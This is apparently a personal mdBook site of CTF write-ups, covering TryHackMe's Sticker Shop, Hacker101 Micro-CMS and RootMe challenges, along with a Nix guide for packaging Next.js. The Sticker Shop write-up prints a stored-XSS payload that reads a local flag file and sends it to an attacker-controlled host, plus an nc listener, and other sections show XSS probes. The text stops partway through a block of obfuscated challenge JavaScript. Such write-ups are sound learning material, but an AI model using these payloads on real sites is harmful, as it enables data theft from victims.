<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title></title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="about.html">About</a></li><li class="chapter-item expanded affix "><li class="part-title">Nix-OS</li><li class="chapter-item expanded "><a href="Nix-OS/package-nextjs-Nix.html"><strong aria-hidden="true">1.</strong> Package nextjs in nix</a></li><li class="chapter-item expanded affix "><li class="part-title">TryHackMe</li><li class="chapter-item expanded "><a href="tryhackme/The-Sticker-Shop.html"><strong aria-hidden="true">2.</strong> The Sticker Shop</a></li><li class="chapter-item expanded affix "><li class="part-title">Hackerone CTF</li><li class="chapter-item expanded "><a href="hacker101/get-started/index.html"><strong aria-hidden="true">3.</strong> Get Started</a></li><li class="chapter-item expanded "><a href="hacker101/Micro-CMSv1/index.html"><strong aria-hidden="true">4.</strong> Micro CMSv1</a></li><li class="chapter-item expanded affix "><li class="part-title">RootMe</li><li class="chapter-item expanded "><a href="rootme/APP_SYSTEM/index.html"><strong aria-hidden="true">5.</strong> APP System</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/APP_SYSTEM/ELF_x86_Stack_buffer_overflow_basic_1/index.html"><strong aria-hidden="true">5.1.</strong> ELF x86 Stack BOF basic 1</a></li></ol></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/index.html"><strong aria-hidden="true">6.</strong> WEB CLIENT</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/HTML_disabled_buttons/index.html"><strong aria-hidden="true">6.1.</strong> HTML - disabled buttons</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/JS_Authentication/index.html"><strong aria-hidden="true">6.2.</strong> JS Authentication</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Authentication/index.html"><strong aria-hidden="true">6.3.</strong> Javascript - Authentication</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Native_code/index.html"><strong aria-hidden="true">6.4.</strong> Javascript - Native code</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Obfuscation_JS/index.html"><strong aria-hidden="true">6.5.</strong> Obfuscation JS</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Obfuscation_2/index.html"><strong aria-hidden="true">6.6.</strong> Javascript - Obfuscation 2</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Source/index.html"><strong aria-hidden="true">6.7.</strong> Javascript - Source</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript-Obfuscation-3/index.html"><strong aria-hidden="true">6.8.</strong> Javascript - Obfuscation 3</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript-Webpack/index.html"><strong aria-hidden="true">6.9.</strong> Javascript Webpack</a></li></ol></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/index.html"><strong aria-hidden="true">7.</strong> WEB SERVER</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/WEB_Server/JWT-Introduction/index.html"><strong aria-hidden="true">7.1.</strong> JWT Introduction</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="latte">Latte</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="frappe">Frappé</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="macchiato">Macchiato</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mocha">Mocha</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="about"><a class="header" href="#about">About</a></h1>
<h3 align="center">
	<img src="https://avatars.githubusercontent.com/u/211311179?v=4&h=300&w=300&fit=cover&mask=circle&maxage=7d
)" width="100" alt="Logo"/><br/>
@pwnspirit
	<img src="https://raw.githubusercontent.com/catppuccin/catppuccin/main/assets/misc/transparent.png" height="30" width="0px"/>
</h3>
<p>Hii, I'm <a href="https://github.com/pwnspirit">pwnspirit</a>. I am a 18 years old guy from Nepal, who loves computers and softwares.</p>
<p>I'm a Security Researcher(not by profession), I play ctfs and do <a href="https://hackerone.com/pwnspirit">Bug Bounty</a>. I believe in secure software and FOSS. Here you can find most of my writeups related to <a href="https://ctf.hackthebox.com/user/profile/369283">CTFs'</a> and my findings.</p>
<h4 id="my-online-links"><a class="header" href="#my-online-links"><code>My online links</code></a></h4>
<ul>
<li><a href="https://x.com/pwnspirit">x/@pwnspirit</a></li>
<li><a href="https://github.com/pwnspirit">github/@pwnspirit</a></li>
<li><a href="https://ko-fi.com/pwnspirit">Ko-fi/@pwnspirit</a></li>
</ul>
<p align="center">
  <img src="https://raw.githubusercontent.com/catppuccin/catppuccin/main/assets/footers/gray0_ctp_on_line.svg?sanitize=true" />
</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="packaging-next-js-webapps-on-nix"><a class="header" href="#packaging-next-js-webapps-on-nix">Packaging Next-JS Webapps on Nix</a></h2>
<p>Recently, I just started to learn <a href="https://nextjs.org">NextJS</a> to broaden my security knowledge, since my primer OS is <a href="https://nixos.org">Nix</a>, there is a need of configuring NextJS environment. This Post will explain how I package a NextJS <a href="https://en.wikipedia.org/wiki/Web_application">Webapp</a> in my <a href="https://github.com/codedsprit/nix">Nix-OS</a>.</p>
<h3 id="packaging"><a class="header" href="#packaging">Packaging</a></h3>
<h4 id="statically-exported-webapps"><a class="header" href="#statically-exported-webapps">Statically Exported Webapps</a></h4>
<p>Statically exported ones are easy to package, because it is a matter of running npm build (or whatever your build script is) with the following NextJS settings</p>
<pre><code class="language-js">// next.config.js
module.exports = {
  distDir: "dist", // an artitrary path for your export
  output: "export",
};
</code></pre>
<p>This will export a static website with a bunch of html files that you can then serve with nodePackages.serve or a webserver like nginx or apache. And that is the end of your worries for a statically exported website! No headache, just write a simple derivation, such as the one below</p>
<pre><code class="language-bash"># default.nix
{
  buildNpmPackage,
  pkg-config,
  python3,
  ...
}:
buildNpmPackage {
  pname = "your-website";
  version = "0.1";

  src = ./.;
  # needs to be updated everytime you update npm dependencies
  npmDepsHash = "sha256-some-hash";
  # some npm packages may need to be built from source, because nodejs is a *terrible* ecosystem
  nativeBuildInputs = [pkg-config python3];

 # move exported website to $out
 postInstall = ''
    cp -rf dist/* $out
  '';
}
</code></pre>
<h3 id="webapps-that-cannot-be-statically-exported"><a class="header" href="#webapps-that-cannot-be-statically-exported">Webapps that cannot be statically exported</a></h3>
<p>If your website depends on API routes for some reasons, then Next will not allow you to do static export. Which means you need to run next start in some shape or form. While a systemd service is certainly a way of doing it (one that I do not recommend), a oci container works as well if not better.</p>
<p>You can write a "simple" docker image for your oci container to use, such as the one below</p>
<pre><code class="language-bash"># dockerImage.nix
{
  pkgs,
  inputs,
  ...
}: {
  dockerImage = pkgs.dockerTools.buildImage {
    config = {
      WorkingDir = "/your-website";
      Cmd = ["npm" "run" "serve"];
    };

    name = "your-website";
    tag = "latest";

    fromImage = pkgs.dockerTools.buildImage {
      name = "node";
      tag = "18-alpine";
    };

    copyToRoot = pkgs.buildEnv {
      name = "image-root";

      paths = with pkgs; [
        # this package is called from a flake.nix alongside the derivation for the website
        inputs.self.packages.${pkgs.stdenv.system}.your-website
        nodejs
        bash
      ];

      pathsToLink = [
        "/bin"
        "/your-website"
      ];
    };
  };
}

</code></pre>
<p>Then, configure oci-containers module option to pick up the Docker image that you have built.</p>
<pre><code class="language-bash">virtualisation.oci-containers = {
  backend = "podman";
  containers = {
    "website-container" = {
      autoStart = true;
      ports = [
        "3000:3000" # bind container's port 3000 to the outside port 3000 for NextJS
      ];

      extraOptions = ["--network=host"];

      image = "your-website";
      imageFile = inputs.website-flake.packages.${pkgs.stdenv.system}.dockerImage;
    };
  };
};
</code></pre>
<p>After a rebuild, your system will provision the container and start it on port 3000. You can access it with your-server-ip:3000 in your browser, and even configure nginx to set up a reverse proxy to assign your domain.</p>
<pre><code class="language-bash">"example.com" = {
  locations."/".proxyPass = "http://127.0.0.1:3000";
};
</code></pre>
<p>This will assign your domain to your webserver, and allow outside visitors to view your "awesome" NextJS webapp.</p>
<div style="break-before: page; page-break-before: always;"></div><img width="100" align="center" alt="thm" src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377390091" />
<h1 id="the-sticker-shop"><a class="header" href="#the-sticker-shop">The Sticker Shop</a></h1>
<p><strong>Can you exploit the sticker shop in order to capture the flag?</strong></p>
<p>Starting task, as we are going to face with a server run by a Local Sticker Shop hosted. I started the machine and jump over it.</p>
<img width="1000" align="starting the machine" src="https://github.com/user-attachments/assets/3f0cd8ae-fec8-49b9-b1f2-c571779d3b88" />
<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
<p>The first step I took is to visit the website and looked for the source and found <code>/submit_feedback</code> dir, which catched me.</p>
<div class="table-wrapper"><table><thead><tr><th><img widht="900" src="https://github.com/user-attachments/assets/4a67214b-a540-4705-a765-53b4eff79e2e" /></th><th><img width="900" src="https://github.com/user-attachments/assets/6741784c-c161-4b4d-a135-e871ae2f9742" /></th></tr></thead><tbody>
</tbody></table>
</div>
<p>And I visited to <strong><code>/submit_feedback</code></strong> and found a submition functionality available.</p>
<img width="1000" alt="Screenshot from 2025-01-03 07-33-51" src="https://github.com/user-attachments/assets/7180ce37-e12d-430e-9481-b9236d30d07d" />
<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
<p>As soon I saw this, I just started to try random XSS payloads, from <a href="https://github.com/payloadbox/xss-payload-list">payloadbox/xss-payload-list</a>, and cam to this payload..</p>
<pre><code class="language-js">&lt;img src=x onerror="fetch('&lt;ip&gt;:8080')"/&gt;
</code></pre>
<blockquote>
<p>[!NOTE]
In the above payload an image would be loaded as img tag refers to <strong>X</strong> location, since the src fail to load and it simply goes to execute following and we just can grap the http request using <code>nc</code></p>
<pre><code class="language-js">fetch('http://&lt;ip&gt;:8080');
</code></pre>
</blockquote>
<p>And I just <code>nc</code> the headers before the submition of the payload, and yeah like this !!!</p>
<pre><code class="language-bash">nc -knvlp 8080
</code></pre>
<div class="table-wrapper"><table><thead><tr><th><img src="https://github.com/user-attachments/assets/16818b62-29b4-428f-bfb6-a7df43471f59" alt="Screenshot from 2025-01-03 08-10-35" /></th><th><img src="https://github.com/user-attachments/assets/122afe12-63cb-4e5c-a3f4-f140ab4fa642" alt="Screenshot from 2025-01-03 08-08-40" /></th></tr></thead><tbody>
<tr><td><img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" /></td><td></td></tr>
<tr><td>Now to grab the flag I have used the following payload..</td><td></td></tr>
</tbody></table>
</div>
<pre><code class="language-js">&lt;img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r =&gt; r.text()).then(r =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + r)).catch(e =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + e))"/&gt;
</code></pre>
<blockquote>
<p>[!NOTE]
Componenets..</p>
</blockquote>
<ul>
<li><code>&lt;img src="x" onerror="..."&gt;</code>  - The image <code>src</code> is invalid, causing the <code>onerror</code> attribute to execute when the browser fails to load the image.</li>
<li><code>fetch('http://127.0.0.1:8080/flag.txt')</code> - This initiates an HTTP GET request to the victim's localhost at port 8080, targeting the <code>flag.txt</code> file.</li>
<li><code>.then(r =&gt; r.text())</code> - If the request succeeds, this processes the response (<code>r</code>) and converts it into text using the <code>.text()</code> method.</li>
<li><code>.then(r =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + r))</code> - After retrieving the file content, another <code>fetch</code> request sends the content (<code>r</code>) to the attacker's server (<code>http://&lt;ip&gt;:8080</code>) as part of the query string (<code>?c=...</code>).</li>
<li><code>.catch(e =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + e))</code> - If the initial <code>fetch</code> fails (e.g., the file doesn't exist or CORS blocks the request), the <code>catch</code> block handles the error and sends the error message (<code>e</code>) to the attacker's server.
<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
<img width="1000" alt="flag png" src="https://github.com/user-attachments/assets/f78b265d-6508-4b29-948d-77f0af9e3d58" /></li>
</ul>
<p><em><strong>Yes! Thank you for reading till here ;)</strong></em></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="a-little-something-to-get-you-started"><a class="header" href="#a-little-something-to-get-you-started">A little something to get you started</a></h3>
<p>Here is the initial look when I spawn the challenge.</p>
<p><img src="hacker101/get-started/image.png" alt="alt text" /></p>
<p>After looking into the source, I can see there is a <code>background.png</code> file ,</p>
<p><img src="hacker101/get-started/image-1.png" alt="alt text" /></p>
<p>Let's try to access it.</p>
<p>Here we got the flag. ease : )</p>
<p><img src="hacker101/get-started/image-2.png" alt="flag" /></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="micro-cms-v1"><a class="header" href="#micro-cms-v1">Micro-CMS v1</a></h3>
<p>So In this challenge, we need to find the 4 flags and submit it to h1ctf. Let's try to solve the chall.
Here is the first look when I spawn the chall.</p>
<p><img src="hacker101/Micro-CMSv1/image-2.png" alt="alt text" /></p>
<p>We can edit the already posted readme and create another one. Let's try to create a new one. Here, I created one with <code>pwntest</code> and the interesting thing is the url for the post which is <code>page/9</code></p>
<pre><code class="language-js">https://10f9bae117c1def0cfa05ff020a257ff.ctf.hacker101.com/page/9
</code></pre>
<p>After that I tried to visit all the pages from 0 to 9. But we got a forbidden page for post 4. Interesting(noted).</p>
<p><img src="hacker101/Micro-CMSv1/image-1.png" alt="alt text" /></p>
<p>There is written, script is not allowed, which I think we can trigger XSS by editing the markdown file.</p>
<p><img src="hacker101/Micro-CMSv1/image-3.png" alt="alt text" /></p>
<p>I searched for some payloads over github. I'm looking for something like marddown taks which can pop up XSS and found this payload. let's execute this.</p>
<pre><code class="language-md">&lt;img src =q onerror=prompt(8)&gt;
</code></pre>
<p>yup, we got the first flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-5.png" alt="alt text" /></p>
<p>Let's look for another, As mentioned earlier, we were facing <code>forbidden</code> at page <code>4</code>, let's try to edit the page instead of accessing it. yup, we got another flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-6.png" alt="alt text" /></p>
<p>Yup, I was trying to play with charectors like <code>", "+, '</code> and got the flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-7.png" alt="alt text" /></p>
<p>Now, for the last flag , I used</p>
<pre><code class="language-js">&lt;script&gt;alert(7*7)&lt;/script&gt;
</code></pre>
<p>in the title section, and it gave me the final flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-9.png" alt="alt text" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="app-system"><a class="header" href="#app-system">APP System</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h3 id="elf-x86---stack-buffer-overflow-basic-1"><a class="header" href="#elf-x86---stack-buffer-overflow-basic-1">ELF x86 - Stack buffer overflow basic 1</a></h3>
<p>Here is the <code>C</code> code which is given in the chall.</p>
<details>
<summary>C code</summary>
<pre><code class="language-c">#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) &amp;&amp; (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
</code></pre>
</details>
<p>Let's access the server via <code>ssh</code>. and try to solve the chall.</p>
<pre><code class="language-bash">
ssh -p 2222 app-systeme-ch13@challenge02.root-me.org
</code></pre>
<p>Here, we have some files which got my attention.</p>
<img alt="image" src="https://github.com/user-attachments/assets/0f960bfd-a5cc-4b96-a72c-81c3ae689de3" />
<p>We have a <code>.passwd</code> file, and it seems like there we can get the flag for the chall. Unfortunately. we cann't access the file, as we don't have access for it.</p>
<img alt="image" src="https://github.com/user-attachments/assets/4e81e592-3263-424d-a447-40b26b7d1a05" />
<p>Now, let's dive into the vulnerable code and spawn the shell,</p>
<p>We have <code>char buf[40];</code> buffer set but the program allows <code>fgets(buf, 45, stdin);</code> 45 long buffer. So, my metholodogy will be</p>
<ol>
<li>The <code>check</code> variable is stored right after the buffer in memory.</li>
<li>By overflowing the buffer, we can overwrite <code>check</code>.</li>
<li>We need to change <code>check</code> to <code>0xdeadbeef</code>.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-client"><a class="header" href="#web-client">WEB CLIENT</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h3 id="html---disabled-buttons"><a class="header" href="#html---disabled-buttons">HTML - disabled buttons</a></h3>
<h4 id="html-protection--huh-make-sense"><a class="header" href="#html-protection--huh-make-sense">HTML protection ? huh make sense.</a></h4>
<p>As we can see there is nothing rather than spawn machine and a statement <em><strong>This form is disabled and can not be used. It’s up to you to find a way to use it.</strong></em>.
I just spawn the chall, and got interface like below:</p>
<img alt="image" src="https://github.com/user-attachments/assets/9e40530a-f1e2-4b0b-9f8b-7e597b468137" />
<p>And checked from the browser dev tool. As you can in the attached screnshot, there is <code>input</code> with value <code>disabled</code>. What if I change it to enabled ?? Let's see:</p>
<img alt="image" src="https://github.com/user-attachments/assets/43371f08-0183-478c-83b8-01e77731b2a6" />
<p>Now , I can submit member access, I put <code>anything</code> there and I got the password.</p>
<img alt="image" src="https://github.com/user-attachments/assets/aede9324-9e75-4e64-8be6-e35af7464224" />
<div style="break-before: page; page-break-before: always;"></div><h3 id="js-authentication"><a class="header" href="#js-authentication">JS Authentication</a></h3>
<p>This time also source code but little different, We got the following code.</p>
<pre><code class="language-js">function connexion(){
    var username = prompt("Username :", "");
    var password = prompt("Password :", "");
    var TheLists = ["reallyhidden"];
    for (i = 0; i &lt; TheLists.length; i++)
    {
        if (TheLists[i].indexOf(username) == 0)
        {
            var TheSplit = TheLists[i].split(":");
            var TheUsername = TheSplit[0];
            var ThePassword = TheSplit[1];
            if (username == TheUsername &amp;&amp; password == ThePassword)
            {
                alert("Vous pouvez utiliser ce mot de passe pour valider ce challenge (en majuscules) / You can use this password to validate this challenge (uppercase)");
            }
        }
        else
        {
            alert("Nope, you're a naughty hacker.")
        }
    }
}
</code></pre>
<p>Here you can see Hardcoded credentials list: which is <code>["reallyhidden"];</code>, I submitted it as username and password.</p>
<img alt="image" src="https://github.com/user-attachments/assets/06e6a006-dbe9-43cb-b452-0f904baa5411" />
<hr />
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---authentication"><a class="header" href="#javascript---authentication">Javascript - Authentication</a></h3>
<p>The challenge seems like authentication bypass or something like this. I have stated the chall and it bring me to login page.</p>
<img alt="image" src="https://github.com/user-attachments/assets/29fc358f-300c-4adc-b919-88b40c82aa8d" />
<p>I tried login using default password and username like <code>admin</code> &amp; <code>admin</code> OR <code>admin</code> &amp; <code>pass</code> but didn't work.</p>
<p>After that I continue to look over source code. There I can find a JS script called <code>login.js</code>, in which we got our creds.</p>
<img alt="image" src="https://github.com/user-attachments/assets/7bf1f1d0-1865-440b-a86d-ecc464ae0c07" />
<p>I submitted the password as password, and yahu it got solved.</p>
<h4 id="lesson-learned"><a class="header" href="#lesson-learned">lesson learned,</a></h4>
<blockquote>
<p>Always read source code, alware inspect even if its a 404 page : )</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---native-code"><a class="header" href="#javascript---native-code">Javascript - Native code</a></h3>
<p>After opening the challenge, we got a password input poping up, but we don't know the password. The goal is to find the password.</p>
<img alt="image" src="https://github.com/user-attachments/assets/318c5b0e-07ee-476b-b943-f1d773f2d772" />
<p>Let's instpect the source and try to find the password. Here we got something like gibbrish code (JSfuck)
<img alt="image" src="https://github.com/user-attachments/assets/eee3931a-9568-4b7a-bd2c-9711de8c2802" /></p>
<p>If we decode the code we might able to find the flag, the One way to decode the JS fuck code is console, lets try it.</p>
<pre><code class="language-js">   &lt;script&gt;
            É = -~-~[],
            ó = -~É,
            Ë = É &lt;&lt; É,
            þ = Ë + ~[];
            Ì = (ó - ó)[Û = ('' + {})[É + ó] + ('' + {})[ó - É] + ([].ó + '')[ó - É] + (!!'' + '')[ó] + ({} + '')[ó + ó] + (!'' + '')[ó - É] + (!'' + '')[É] + ('' + {})[É + ó] + ({} + '')[ó + ó] + ('' + {})[ó - É] + (!'' + '')[ó - É]][Û];
            Ì(Ì((!'' + '')[ó - É] + (!'' + '')[ó] + (!'' + '')[ó - ó] + (!'' + '')[É] + ((!'' + ''))[ó - É] + ([].$ + '')[ó - É] + '\'' + '' + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó - ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (ó + ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + É) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (É + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (þ) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó + ó) + (ó - É) + '\\' + (ó + ó) + (É) + '\\' + (ó + ó) + (ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\\' + (ó - É) + (É + É) + (É + 